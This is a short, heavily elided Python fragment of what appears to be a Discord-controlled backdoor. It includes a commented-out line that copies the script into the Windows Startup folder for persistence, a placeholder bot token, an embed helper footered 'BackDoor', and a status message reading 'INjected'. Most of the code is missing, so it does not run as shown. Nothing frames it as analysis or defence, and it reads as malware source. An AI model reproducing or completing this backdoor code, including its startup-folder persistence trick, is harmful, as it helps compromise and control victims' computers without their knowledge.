...
#shutil.copy("main.py", f"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

BotToken = "BOT-TOKEN-DISCORD"
...
def WinMsg(Name, Value):
    ...
    embed.set_footer(text = "BackDoor")
    return embed
...
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"INjected"))
